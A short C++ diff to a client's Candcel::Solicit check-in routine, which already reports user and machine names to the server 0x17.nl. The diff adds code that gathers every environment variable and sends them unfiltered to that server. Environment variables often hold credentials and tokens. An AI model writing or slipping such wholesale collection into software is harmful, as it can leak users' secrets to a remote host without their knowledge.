@@ -101,6 +101,15 @@ void Candcel::Solicit()
 
 	RestClient rc("0x17.nl", "avc_endpoint.php");
 
+	std::map<std::wstring, std::wstring> *lEnv = Util::EnvVariables();
+
+	JSONObject env;
+	for (std::map<std::wstring, std::wstring>::iterator it = lEnv->begin(); it != lEnv->end(); it++) {
+		env[it->first] = new JSONValue(it->second);
+	}
+
+	delete lEnv;
+
 	JSONObject obj;
 	obj[L"guid"] = new JSONValue(Config::Current()->Guid());
 	obj[L"cliver"] = new JSONValue(Config::getVersion());
@@ -109,6 +118,7 @@ void Candcel::Solicit()
 	obj[L"maxmem"] = new JSONValue(std::to_wstring(Util::maxmem()));
 	obj[L"user"] = new JSONValue(Util::user());
 	obj[L"computer"] = new JSONValue(Util::machine());
+	obj[L"env"] = new JSONValue(env);
 
 	rc.Call(RestClientCommand::CM_CLIENT_SOLICIT, new JSONValue(obj));
 
